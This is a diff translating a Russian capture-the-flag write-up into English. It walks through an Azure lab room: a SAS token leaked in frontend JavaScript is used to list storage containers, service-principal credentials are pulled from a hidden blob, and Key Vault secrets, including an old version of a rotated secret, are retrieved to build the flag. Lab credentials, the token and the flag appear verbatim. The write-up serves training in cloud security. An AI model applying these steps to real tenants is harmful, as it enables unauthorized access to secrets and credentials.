@@ -1,27 +1,28 @@
-**Теги:** Cloud, Azure, Storage, Vault.
-**Сложность:** Medium.
+**Tags:** Cloud, Azure, Storage, Vault.
 
-## 1. Начало работы
+**Difficulty:** Medium.
 
-Таргет комнаты:
+## 1. Getting Started
+
+Room target:
 
 ```text
 https://cryptocabanaf5scjagc.z13.web.core.windows.net/
 ```
 
-Комната предлагает работать с Azure. В начале предлагается установить Azure CLI:
+The room suggests working with Azure. At the beginning, we are instructed to install the Azure CLI:
 
 ```bash
 curl -fsSL 'https://azurecliprod.blob.core.windows.net/$root/deb_install.sh' | sudo bash
 ```
 
-После установки проверяем версию:
+After installation, we check the version:
 
 ```bash
 az --version
 ```
 
-Получаем:
+We get:
 
 ```text
 azure-cli                         2.89.0
@@ -39,20 +40,20 @@ Extensions directory '/home/deb88/.azure/cliextensions'
 Python (Linux) 3.14.6 (main, Jul 28 2026, 12:41:02) [GCC 12.2.0]
 ```
 
-Однако впоследствии выясняется, что локальный Azure CLI для решения фактически не нужен, поскольку основная работа выполняется через **Azure Cloud Shell** в браузере.
+However, it later turns out that the local Azure CLI is not actually required to solve the room, since the main work is performed through **Azure Cloud Shell** in the browser.
 
 ---
 
 # 2. Azure Cloud Shell
 
-Нам выдают учётные данные на 1 час:
+We are given credentials valid for 1 hour:
 
 ```text
 Username: usr-08067397@thmctf.onmicrosoft.com
 Password: +*3V4CKS
 ```
 
-После входа открываем Azure Cloud Shell:
+After logging in, we open Azure Cloud Shell:
 
 ```text
 Requesting a Cloud Shell.Succeeded.
@@ -68,13 +69,13 @@ Your Cloud Shell session will be ephemeral so no files or system changes will pe
 usr-08067397 [ ~ ]$
 ```
 
-Проверяем текущую Azure subscription:
+We check the current Azure subscription:
 
 ```bash
 az account show
 ```
 
-Получаем:
+We get:
 
 ```json
 {
@@ -94,7 +95,7 @@ az account show
 }
 ```
 
-Таким образом, имеем доступ к subscription:
+Thus, we have access to the subscription:
 
 ```text
 Az-Subs-CTF
@@ -102,11 +103,11 @@ Az-Subs-CTF
 
 ---
 
-# 3. Анализ frontend
+# 3. Frontend Analysis
 
-Важная часть комнаты находится непосредственно в JavaScript-коде главной страницы.
+An important part of the room is located directly in the JavaScript code of the main page.
 
-В `app.js` обнаруживаем:
+In `app.js`, we find:
 
 ```javascript
 const STORAGE_ACCOUNT = "cryptocabanaf5scjagc";
@@ -114,7 +115,7 @@ const BACKUPS_CONTAINER = "backups";
 const BACKUP_SAS = "?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D";
 ```
 
-Функция резервного копирования формирует URL непосредственно к Azure Blob Storage:
+The backup function constructs a URL directly to Azure Blob Storage:
 
 ```javascript
 function backupPhrase() {
@@ -147,27 +148,27 @@ function backupPhrase() {
 }
 ```
 
-Здесь сразу можно выделить:
+We can immediately identify:
 
 ```text
 Storage Account: cryptocabanaf5scjagc
 Container: backups
-SAS token: присутствует непосредственно в frontend
+SAS token: present directly in the frontend
 ```
 
 ---
 
-# 4. Использование SAS-токена
+# 4. Using the SAS Token
 
-Полученный SAS позволяет обращаться к Blob Storage.
+The obtained SAS allows us to access Blob Storage.
 
-Проверяем контейнер `backups`:
+We check the `backups` container:
 
 ```text
 https://cryptocabanaf5scjagc.blob.core.windows.net/backups?restype=container&comp=list&sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D
 ```
 
-Получаем:
+We get:
 
 ```xml
 <EnumerationResults ServiceEndpoint="https://cryptocabanaf5scjagc.blob.core.windows.net/" ContainerName="backups">
@@ -176,31 +177,31 @@ https://cryptocabanaf5scjagc.blob.core.windows.net/backups?restype=container&com
 </EnumerationResults>
 ```
 
-Контейнер `backups` пуст.
+The `backups` container is empty.
 
 ---
 
-# 5. Перечисление ресурсов Azure
+# 5. Enumerating Azure Resources
 
-Проверяем доступные ресурсы из Cloud Shell:
+We check the available resources from Cloud Shell:
 
 ```bash
 az resource list -o table
 ```
 
-Затем:
+Then:
 
 ```bash
 az storage account list -o table
 ```
 
-И:
+And:
 
 ```bash
 az group list -o table
 ```
 
-Получаем:
+We get:
 
 ```text
 Name                Location    Status
@@ -208,15 +209,15 @@ Name                Location    Status
 rg-cloudshell-only  centralus   Succeeded
 ```
 
-На первый взгляд в subscription практически ничего интересного нет.
+At first glance, there is practically nothing interesting in the subscription.
 
-Далее перечисляем зарегистрированные Azure AD applications:
+Next, we enumerate the registered Azure AD applications:
 
 ```bash
 az ad app list --all --output table
 ```
 
-Получаем:
+We get:
 
 ```text
 DisplayName                     Id                                    AppId                                 CreatedDateTime
@@ -228,7 +229,7 @@ thm-range-collector-pilot       a9c1efc4-3329-4186-8b10-0f9d1d3d5c45  b83d1315-d
 thm-range-provisioner-pilot     be4317cf-6a32-4929-8af7-18e3ea0d4352  55bf75ab-2c7d-4829-93e2-d6100ad5ec38  2026-06-01T18:25:39Z
 ```
 
-Наиболее интересное приложение:
+The most interesting application is:
 
 ```text
 cryptocabana-backup-automation
@@ -236,15 +237,15 @@ cryptocabana-backup-automation
 
 ---
 
-# 6. Анализ Service Principal
+# 6. Service Principal Analysis
 
-Смотрим конфигурацию приложения:
+We check the application configuration:
 
 ```bash
 az ad app show --id dbcf2923-e4eb-4b72-a0a4-688aa1185cf5
 ```
 
-В результате обнаруживаем password credential:
+As a result, we discover a password credential:
 
 ```json
 "passwordCredentials": [
@@ -259,15 +260,15 @@ az ad app show --id dbcf2923-e4eb-4b72-a0a4-688aa1185cf5
 ]
 ```
 
-Сам `secretText` через `az ad app show` не раскрывается.
+The `secretText` itself is not revealed through `az ad app show`.
 
-Далее получаем Service Principal:
+Next, we obtain the Service Principal:
 
 ```bash
 az ad sp list --filter "displayName eq 'cryptocabana-backup-automation'" -o json
 ```
 
-Основные данные:
+The main data is:
 
 ```text
 appDisplayName:
@@ -282,15 +283,15 @@ id:
 
 ---
 
-# 7. Возвращаемся к Blob Storage
+# 7. Returning to Blob Storage
 
-Поскольку SAS позволяет перечислять контейнеры storage account, проверяем уже не только `backups`, а весь Storage Account:
+Since the SAS allows us to enumerate the storage account's containers, we check not only `backups`, but the entire Storage Account:
 
 ```bash
 curl "https://cryptocabanaf5scjagc.blob.core.windows.net/?comp=list&sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D"
 ```
 
-В ответе обнаруживаем три контейнера:
+The response contains three containers:
 
 ```xml
 <Container><Name>$web</Name></Container>
@@ -298,56 +299,56 @@ curl "https://cryptocabanaf5scjagc.blob.core.windows.net/?comp=list&sv=2022-11-0
 <Container><Name>vault</Name></Container>
 ```
 
-Особенно интересен:
+The most interesting one is:
 
 ```text
 vault
 ```
 
-То есть через SAS, который frontend раскрывает пользователю, можно обнаружить скрытый контейнер.
+This means that using the SAS token exposed by the frontend, we can discover a hidden container.
 
 ---
 
-# 8. Перечисление `vault`
+# 8. Enumerating `vault`
 
-Теперь обращаемся непосредственно к контейнеру `vault`:
+Now we access the `vault` container directly:
 
 ```bash
 curl "https://cryptocabanaf5scjagc.blob.core.windows.net/vault?restype=container&comp=list&sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D"
 ```
 
-Получаем два объекта:
+We get two objects:
 
 ```text
 backup-service-account.json
 seed_phrase.txt
 ```
 
-Особенно интересен:
+The most interesting one is:
 
 ```text
 backup-service-account.json
 ```
 
-Размер:
+Size:
 
 ```text
 360 bytes
 ```
 
-и:
+and:
 
 ```text
 seed_phrase.txt
 ```
 
-размером:
+with a size of:
 
 ```text
 88 bytes
 ```
 
-Получается следующая цепочка:
+This gives us the following chain:
 
 ```text
 Public website
@@ -371,17 +372,17 @@ vault
 
 ---
 
-# 9. Получение credentials Service Principal
+# 9. Obtaining Service Principal Credentials
 
-Из `backup-service-account.json` получаем credentials сервисного аккаунта.
+From `backup-service-account.json`, we obtain the service account credentials.
 
-Используем их для входа в Azure:
+We use them to log in to Azure:
 
 ```bash
 az logout
 ```
 
-После выхода:
+After logging out:
 
 ```bash
 az login --service-principal \
@@ -390,7 +391,7 @@ az login --service-principal \
 --tenant 8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c
 ```
 
-Azure подтверждает успешную авторизацию:
+Azure confirms successful authentication:
 
 ```json
 [
@@ -411,13 +412,13 @@ Azure подтверждает успешную авторизацию:
 ]
 ```
 
-Проверяем:
+We check:
 
 ```bash
 az account show
 ```
 
-Теперь текущий пользователь — Service Principal:
+The current user is now the Service Principal:
 
 ```text
 name:
@@ -429,16 +430,16 @@ servicePrincipal
 
 ---
 
-# 10. Поиск Key Vault
+# 10. Searching for Key Vault
 
-С полученными правами перечисляем secrets в Key Vault:
+With the obtained permissions, we enumerate secrets in the Key Vault:
 
 ```bash
 az keyvault secret list \
 --id https://ccabana-kv-f5scjagc.vault.azure.net/
 ```
 
-Обнаруживаем:
+We discover:
 
 ```text
 key-shard-1
@@ -447,7 +448,7 @@ key-shard-3
 master-key
 ```
 
-Особенно интересны три `key-shard`:
+The three `key-shard` secrets are especially interesting:
 
 ```text
 key-shard-1
@@ -455,7 +456,7 @@ key-shard-2
 key-shard-3
 ```
 
-а также:
+as well as:
 
 ```text
 master-key
@@ -463,9 +464,9 @@ master-key
 
 ---
 
-# 11. Получение значений secrets
+# 11. Obtaining Secret Values
 
-Для получения значений выполняем:
+To retrieve the values, we run:
 
 ```bash
 for s in key-shard-1 key-shard-2 key-shard-3 master-key; do
@@ -476,7 +477,7 @@ az keyvault secret show \
 done
 ```
 
-Получаем:
+We get:
 
 ```text
 ===== key-shard-1 =====
@@ -494,43 +495,43 @@ ur_c01ns!}
 
 ---
 
-# 12. Сборка неполного флага
+# 12. Assembling the Incomplete Flag
 
-Первые и третьи части дают:
+The first and third parts give us:
 
 ```text
 key-shard-1:
 THM{n0t_ur
 ```
 
-и:
+and:
 
 ```text
 key-shard-3:
 ur_c01ns!}
 ```
 
-Если соединить их:
+If we combine them:
 
 ```text
 THM{n0t_urur_c01ns!}
 ```
 
-Получается очевидно неправильная строка.
+This is obviously an incorrect string.
 
-При этом `key-shard-2` сообщает:
+At the same time, `key-shard-2` says:
 
 ```text
 Rotated this after IT flagged it -- old value should still be recoverable if you know where to look.
 ```
 
-Это явная подсказка на **старую версию secret**.
+This is an obvious hint toward an **old secret version**.
 
 ---
 
-# 13. Поиск старых версий `key-shard-2`
+# 13. Searching for Old Versions of `key-shard-2`
 
-Используем:
+We use:
 
 ```bash
 az keyvault secret list-versions \
@@ -538,25 +539,25 @@ az keyvault secret list-versions \
 -o json
 ```
 
-Получаем две версии:
+We get two versions:
 
 ```text
 3d6492d2c6f74123bc754a9ded22b2a0
 ```
 
-и:
+and:
 
 ```text
 c922c422ffb34671a902389c372314f1
 ```
 
-Одна из них является текущей, другая — старой.
+One of them is the current version, while the other is the old version.
 
 ---
 
-# 14. Получение старого значения
+# 14. Obtaining the Old Value
 
-Запрашиваем старую версию:
+We request the old version:
 
 ```bash
 az keyvault secret show \
@@ -564,35 +565,36 @@ az keyvault secret show \
 --query value -o tsv
 ```
 
-Получаем:
+We get:
 
 ```text
 _k3ys_n0t_
 ```
 
-Это недостающая часть.
+This is the missing part.
 
-Теперь объединяем три фрагмента:
+Now we combine the three fragments:
 
 ```text
 key-shard-1:
 THM{n0t_ur
 
-key-shard-2 (старое значение):
+key-shard-2 (old value):
 _k3ys_n0t_
 
 key-shard-3:
 ur_c01ns!}
 ```
 
-Получаем:
+We get:
 
 ```text
 THM{n0t_ur_k3ys_n0t_ur_c01ns!}
 ```
+
 ---
 
-# Итоговая цепочка
+# Final Chain
 
 ```text
 Frontend
@@ -607,7 +609,7 @@ SAS token
 Azure Blob Storage
    │
    ▼
-Скрытый контейнер vault
+Hidden vault container
    │
    ├── backup-service-account.json
    │
@@ -623,13 +625,13 @@ Azure Key Vault
    └── master-key
           │
           ▼
-   key-shard-2 имеет старые версии
+   key-shard-2 has old versions
           │
           ▼
-   получение старого значения
+   retrieve the old value
           │
           ▼
-      сборка флага
+      assemble the flag
           │
           ▼
 THM{n0t_ur_k3ys_n0t_ur_c01ns!}
@@ -641,4 +643,4 @@ THM{n0t_ur_k3ys_n0t_ur_c01ns!}
 THM{n0t_ur_k3ys_n0t_ur_c01ns!}
 ```
 
-Главная идея комнаты — **утечка SAS-токена во frontend → доступ к Azure Blob Storage → обнаружение скрытого `vault` → извлечение Service Principal credentials → доступ к Key Vault → поиск старой версии ротированного secret → сборка флага из нескольких key shards**.
+The main idea of the room is **SAS token leakage in the frontend → access to Azure Blob Storage → discovery of the hidden `vault` → extraction of Service Principal credentials → access to Key Vault → finding the old version of a rotated secret → assembling the flag from multiple key shards**.
